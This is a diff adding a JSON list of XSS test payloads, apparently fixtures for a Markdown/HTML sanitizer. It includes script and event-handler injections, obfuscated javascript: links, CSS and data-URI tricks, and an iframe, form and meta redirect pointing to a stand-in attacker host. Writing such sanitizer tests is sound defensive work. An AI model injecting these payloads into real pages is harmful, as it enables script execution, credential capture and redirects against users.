@@ -1,0 +1,23 @@
+[
+  "<script>alert(1)</script>",
+  "<img src=x onerror=alert(1)>",
+  "[点我](javascript:alert(1))",
+  "[点我](JaVaScRiPt:alert(1))",
+  "[点我](< javascript:alert(1)>)",
+  "<a href=\"java&#x09;script:alert(1)\">x</a>",
+  "<a href=\"javascript:alert(1)\">x</a>",
+  "<iframe src=\"https://evil.example\"></iframe>",
+  "<svg onload=alert(1)>",
+  "<svg><script>alert(1)</script></svg>",
+  "<div style=\"background:url(javascript:alert(1))\">x</div>",
+  "<p style=\"width:expression(alert(1))\">x</p>",
+  "<style>body{display:none}</style>",
+  "<object data=x></object>",
+  "<embed src=x>",
+  "<form action=https://evil.example><input name=p></form>",
+  "![x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
+  "<a href=\"https://ok.test\" target=_blank>ok</a>",
+  "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">",
+  "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+  "```ts\n</code><script>alert(1)</script>\n```"
+]
